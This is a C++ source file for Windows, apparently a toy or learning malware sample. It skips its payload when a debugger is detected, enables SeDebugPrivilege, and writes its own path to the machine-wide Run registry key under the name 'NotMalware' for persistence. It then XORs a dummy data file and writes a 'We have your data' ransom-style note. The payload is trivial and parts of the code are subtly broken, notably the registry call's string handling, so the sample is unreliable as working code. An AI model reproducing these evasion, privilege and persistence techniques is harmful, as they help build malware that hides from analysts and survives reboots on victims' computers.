#define WINVER 0x0501
#define _WIN32_WINNT 0x0501
#pragma managed(push, off)
#include <windows.h>
#include <ObjBase.h>
#pragma managed(pop)
#include <iostream>
#include <fstream>
#include <sstream>
using namespace std;

string Xor_OP(const char * str) {
	const char a[5] = { 'C', 'S', '5', '7', '9' };

	string rtn_s;

	for (int i = 0; i < 5; i++) {
		rtn_s += a[i] ^ str[i];
	}

	return rtn_s;
};

int malware() {
	cout << "Malware!!";
	ofstream yourData("YourData.txt");
	yourData << "Brent";

	yourData.close();

	ifstream read_Data("YourData.txt");

	string s;
	string Xor_s;
	while (getline(read_Data, s)) {
		Xor_s.append(Xor_OP(s.data())).append("\n");
	};

	ofstream MyFile("MyFile.txt");
	MyFile << "We have your data\n" << Xor_s;
	MyFile.close();
	return 0;
};

string get_current_WD() {
	char buffer[MAX_PATH] = { 0 };
	GetModuleFileNameA(nullptr, (LPSTR)buffer, MAX_PATH);
	return string(buffer);
}

bool EnableSeDebugPrivilege()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;

	// Open the process token
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return false;

	// Look up the LUID for SeDebugPrivilege
	if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
	{
		CloseHandle(hToken);
		return false;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Apply the privilege adjustment
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		CloseHandle(hToken);
		return false;
	}

	// AdjustTokenPrivileges can succeed but still fail to set the privilege
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		CloseHandle(hToken);
		return false;
	}

	CloseHandle(hToken);
	return true;
}

int regedit(string filename) {
	HKEY hKey;

	int res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_WRITE, &hKey);
	cout << res;
	if (res == ERROR_SUCCESS) {
		cout << "success";
		if (RegSetValueExW(hKey, (LPCWSTR)"NotMalware", 0, REG_SZ, (BYTE *)&filename, (filename.size() + 1)))
		{
			cout << "Key Not Updated" << endl;
			RegCloseKey(hKey);
			return 0;
		}

		RegCloseKey(hKey);
		cout << "Key Updated" << endl;
		return 1;
	}
	return 0;
}



int main() {
	if (!IsDebuggerPresent()) {
		cout << "debugger not present";
		if (EnableSeDebugPrivilege()) {
			cout << "priviliedge enabled";
			const string current_WD = get_current_WD();
			cout << current_WD;
			if (regedit(current_WD)) {
				int i = 0;
				i += 1;
				if (i > 0)
					malware();
				else
					malware();
				return 0;
			}
		}
		return 1;
	}
	return 1;
}